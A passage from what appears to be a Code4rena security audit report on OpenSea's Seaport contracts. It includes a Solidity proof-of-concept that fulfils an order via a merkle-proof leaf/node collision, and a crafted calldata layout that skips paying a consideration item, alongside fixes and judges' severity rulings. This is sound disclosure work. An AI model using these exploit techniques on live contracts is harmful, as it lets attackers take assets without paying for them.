class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">considerationItems</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">/*************** ATTACK STARTS HERE ***************/</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">AdvancedOrder</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">advancedOrder</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">AdvancedOrder</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">orderParameters</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">/* numerator */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk7\">1</span><span class=\"mtk1\">, </span><span class=\"mtk3\">/* denominator */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">signature</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// resolve the merkle root token ID itself</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">CriteriaResolver</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cr</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">CriteriaResolver</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proof</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">cr</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">CriteriaResolver</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint256 orderIndex;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk12\">Side</span><span class=\"mtk1\">.</span><span class=\"mtk12\">CONSIDERATION</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// Side side;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint256 index; (item)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">merkleRoot</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// uint256 identifier;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk12\">proof</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// bytes32[] criteriaProof;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">fulfillAdvancedOrder</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            value: </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">paymentAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }(</span><span class=\"mtk12\">advancedOrder</span><span class=\"mtk1\">, </span><span class=\"mtk12\">cr</span><span class=\"mtk1\">, </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">profit</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">token1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) - </span><span class=\"mtk12\">profit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// @audit could fulfill order without owning NFT 1 or 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">profit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">context</span><span class=\"mtk1\">.</span><span class=\"mtk12\">paymentAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a <em>leaf</em> or not.<br>\nAn elegant fix here is to simply <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250\">use hashes of the tokenIds</a> as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.)<br>\nThen compute the leaf hash in the contract from the provided tokenId:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">function _verifyProof(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 leaf,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 root,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    bytes32[] memory proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) internal pure {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    bool isValid;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    assembly {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        let computedHash := leaf</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  bytes32 computedHash = keccak256(abi.encodePacked(leaf))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span></code></pre>\n<p>There can’t be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.</p>\n<p>Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168\">0age (OpenSea) confirmed, but disagreed with severity</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168\">HardlyDifficult (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168#issuecomment-1163507934\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The attack outlined by the warden showcases how an intermediate node of a proof can be used as leaves, potentially allowing the attacker to resolve the merkle tree to a different <code>tokenId</code>. I think in the majority of cases, this will not allow users to trade on invalid <code>tokenIds</code>, however, considering the <code>ERC721</code> specification does not enforce a standard for how NFTs are represented using <code>tokenIds</code>, the issue has some legitimacy. Because of this, I believe <code>medium</code> severity to be justified.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/168\">0age (OpenSea) resolved</a>:</strong></p>\n<blockquote>\n<p>PR: <a href=\"https://github.com/ProjectOpenSea/seaport/pull/316\">ProjectOpenSea/seaport#316</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-wrong-items-length-assertion-in-basic-order\" style=\"position:relative;\"><a href=\"#m-02-wrong-items-length-assertion-in-basic-order\" aria-label=\"m 02 wrong items length assertion in basic order permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129\">[M-02] Wrong items length assertion in basic order</a></h2>\n<p><em>Submitted by 0xsanson, also found by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349\">BasicOrderFulfiller.sol#L346-L349</a><br></p>\n<p>When fulfilling a basic order we need to assert that the parameter <code>totalOriginalAdditionalRecipients</code> is less or equal than the length of <code>additionalRecipients</code> written in calldata.<br>\nHowever in <code>_prepareBasicFulfillmentFromCalldata</code> this assertion is incorrect <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349\">(L346)</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure supplied consideration array length is not less than original.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">additionalRecipients</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">parameters</span><span class=\"mtk1\">.</span><span class=\"mtk12\">totalOriginalAdditionalRecipients</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span></code></pre>\n<p>The way the function is written (<a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83\">L75</a>), it accepts also a length smaller than the original by 1 (basically there shouldn’t be a <code>+ 1</code> in the first argument).</p>\n<p>Interestingly enough, in the case <code>additionalRecipients.length &#x3C; totalOriginalAdditionalRecipients</code>, the inline-assembly for-loop at <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506\">(L506)</a> will read consideration items out-of-bounds.<br>\nThis can be a vector of exploits, as illustrated below.</p>\n<h3 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Alice makes the following offer: a basic order, with two <code>considerationItem</code>s. The second item has the following data:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">consideration</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">itemType:</span><span class=\"mtk1\"> ...,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">token:</span><span class=\"mtk1\"> ...,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">identifierOrCriteria:</span><span class=\"mtk1\"> ...,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">startAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">X</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">endAmount:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">X</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">recipient:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Y</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>The only quantities we need to track are the amounts <code>X</code> and recipient <code>Y</code>.</p>\n<p>When fulfilling the order normally, the fulfiller will spend <code>X</code> tokens sending them to <code>Y</code>. It’s possible however to exploit the previous bug in a way that the fulfiller won’t need to make this transfer.</p>\n<p>To do this, the fulfiller needs to craft the following calldata:</p>\n<table>\n<thead>\n<tr>\n<th align=\"right\">calldata pointer</th>\n<th align=\"center\">correct calldata</th>\n<th align=\"center\">exploit calldata</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td align=\"right\">…</td>\n<td align=\"center\">…</td>\n<td align=\"center\">…</td>\n</tr>\n<tr>\n<td align=\"right\">0x204</td>\n<td align=\"center\">1 (tot original)</td>\n<td align=\"center\">1 (tot original)</td>\n</tr>\n<tr>\n<td align=\"right\">0x224</td>\n<td align=\"center\">0x240 (head addRec)</td>\n<td align=\"center\">0x240 (head addRec)</td>\n</tr>\n<tr>\n<td align=\"right\">0x244</td>\n<td align=\"center\">0x2a0 (head sign)</td>\n<td align=\"center\">0x260 (head sign)</td>\n</tr>\n<tr>\n<td align=\"right\">0x264</td>\n<td align=\"center\">1 (length addRec)</td>\n<td align=\"center\">0 (length addRec)</td>\n</tr>\n<tr>\n<td align=\"right\">0x284</td>\n<td align=\"center\">X (amount)</td>\n<td align=\"center\">X (length sign)</td>\n</tr>\n<tr>\n<td align=\"right\">0x2a4</td>\n<td align=\"center\">Y (recipient)</td>\n<td align=\"center\">Y (sign body)</td>\n</tr>\n<tr>\n<td align=\"right\">0x2c4</td>\n<td align=\"center\">0x40 (length sign)</td>\n<td align=\"center\">0x00 (sign body)</td>\n</tr>\n<tr>\n<td align=\"right\">0x2e4</td>\n<td align=\"center\">[correct Alice sign]</td>\n<td align=\"center\">…</td>\n</tr>\n<tr>\n<td align=\"right\">0x304</td>\n<td align=\"center\">[correct Alice sign]</td>\n<td align=\"center\">…</td>\n</tr>\n<tr>\n<td align=\"right\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody>\n</table>\n<p>Basically writing <code>additionalRecipients = []</code> and making the signature length = <code>X</code>, with <code>Y</code> being the first 32 bytes.\nOf course this signature will be invalid; however it doesn’t matter since the exploiter can call <code>validate</code> with the correct signature beforehand.</p>\n<p>The transaction trace will look like this:</p>\n<ul>\n<li>the assertion <code>_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength</code> passes;</li>\n<li>the <code>orderHash</code> calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550\">(L513)</a>;</li>\n<li>the order was already validated beforehand, so the signature isn’t read;</li>\n<li>at the end, during the tokens transfers, only <code>offer</code> and <code>consideration[0]</code> are transferred, since the code looks at <code>additionalRecipients</code> which is empty.</li>\n</ul>\n<p>Conclusion:</p>\n<p>Every Order that is “basic” and has two or more consideration items can be fulfilled in a way to not trade the <em>last</em> consideration item in the list. The fulfiller spends less then normally, and a recipient doesn’t get his due.</p>\n<p>There’s also an extra requirement which is stricter: this last item’s <code>startAmount</code> (= endAmount) needs to be smallish (&#x3C; 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.</p>\n<p>I’ve made a hardhat test that exemplifies the exploit. <a href=\"https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4\">(Link to gist)</a></p>\n<h3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Remove the <code>+1</code> at L347.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129#issuecomment-1146181371\">0age (OpenSea) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Valid finding on the off-by-one error, this was already reported to us outside of c4 and we’re going to fix — will mention that it’s very difficult to find / craft exploitable payloads though, so severity should be lower.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129\">HardlyDifficult (judge) decreased severity to Medium</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129#issuecomment-1164660284\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While the issue outlines an exploit whereby an attacker can fulfill an order without paying the entire consideration amount, it does require a set of requirements, namely:</p>\n<ul>\n<li>The item is an ERC20 with low decimals.</li>\n<li>The order has <code>considerationItems > 1</code>.</li>\n</ul>\n<p>Maximum extractable value for the most prevalent ERC20 token with low decimals, <code>WBTC</code>. This token uses 8 decimals and currently we know that calldata uses 16 gas for each byte used. Based on a block gas limit of <code>30,000,000</code>, we can deduce that the calldata length has an upper bound of <code>1.875</code> MB. Based on this, the maximum extractable value would be <code>(1,875,000 / 1e8) * $20,000 USD = $375 USD</code>, assuming the price for each <code>WBTC</code> is $20,000 USD.</p>\n<p>Relevant EIP detailing this is found at <a href=\"https://eips.ethereum.org/EIPS/eip-4488\">https://eips.ethereum.org/EIPS/eip-4488</a>.</p>\n<p>It is also important to note, that by utilising the entire available block space on Ethereum, it is very likely that the cost of the transaction will far exceed the amount received in the attack.</p>\n<p>The attack does in fact leak value by allowing orders to be fulfilled at a slight discount. However, because this only affects very specific order types, I believe <code>medium</code> severity to be justified.</p>\n<blockquote>\n<p>2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.</p>\n</blockquote>\n<p>This was one of the most interesting issues I’ve read, kudos to those who found it!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129\">0age (OpenSea) resolved</a>:</strong></p>\n<blockquote>\n<p>PR: <a href=\"https://github.com/ProjectOpenSea/seaport/pull/317\">ProjectOpenSea/seaport#317</a></p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 29 reports were submitted by wardens detailing low risk and non-critical issues. Many of these reports were integrated into Seaport 1.1, often by the warden themselves; see <a href=\"https://github.com/ProjectOpenSea/seaport/pull/492/files\">this PR</a> from OpenSea for the full set of changes.</p>\n<p>The <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/203\">report highlighted below</a> by team <strong>Spearbit</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/74\">Saw-mon_and_Natalie</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/175\">cmichel</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/145\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/150\">broccoli</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/188\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/123\">sces60107</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/143\">zkhorse</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/113\">shung</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/202\">hack3r-0m</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/189\">peritoflores</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/110\">OriDabush</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/213\">hyh</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/131\">scaraven</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/41\">hickuphh3</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/130\">ilan</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/65\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/135\">0xsanson</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/53\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/163\">kebabsec</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/106\">sorrynotsorry</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/104\">zzzitron</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/21\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/161\">twojoy</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/90\">tintin</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/194\">rfa</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/212\">foobar</a>, <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/196\">hubble</a>, and <a href=\"https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/85\">mayo</a>.</em></p>\n<h2 id=\"table-of-contents\" style=\"position:relative;\"><a href=\"#table-of-contents\" aria-label=\"table of contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Table of Contents</h2>\n<ul>\n<li><strong>[01]</strong> The function <code>_name()</code> returns dirty data</li>\n<li><strong>[02]</strong> <code>_revertWithReasonIfOneIsReturned</code>, <code>_doesNotMatchMagic</code> (and <code>_assertIsValidOrderStaticcallSuccess</code>) have a fragile dependency on call order</li>\n<li><strong>[03]</strong> 